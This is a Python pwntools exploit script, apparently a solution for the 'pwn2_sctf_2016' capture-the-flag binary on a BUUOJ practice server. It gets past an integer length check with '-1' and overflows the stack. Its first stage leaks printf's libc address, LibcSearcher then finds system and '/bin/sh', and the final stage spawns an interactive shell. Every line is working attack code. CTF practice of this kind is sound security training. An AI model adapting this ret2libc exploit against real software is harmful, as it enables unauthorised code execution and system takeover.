from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
io = process('./pwn2_sctf_2016')
# io = remote('node4.buuoj.cn',27641)
elf = ELF('./pwn2_sctf_2016')

main_addr = 0x80485B8
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

io.sendlineafter(b'How many bytes do you want me to read? ',b'-1')
payload = cyclic(0x2c+4) + p32(printf_plt) + p32(main_addr) + p32(printf_got)
io.sendlineafter(b'data!\n',payload)

io.recvuntil(b'\n')
printf_addr = io.recv(4)
print(printf_addr)
printf_addr = u32(printf_addr)
print('printf_addr:',hex(printf_addr))

libc = LibcSearcher('printf',printf_addr)
base = printf_addr - libc.dump('printf')
system_addr = base + libc.dump('system')
bin_sh_addr = base + libc.dump('str_bin_sh')


io.sendlineafter(b'How many bytes do you want me to read? ',b'-1')
payload = cyclic(0x2c+4) + p32(system_addr) + cyclic(4) + p32(bin_sh_addr)
io.sendlineafter(b'data!\n',payload)
io.interactive()
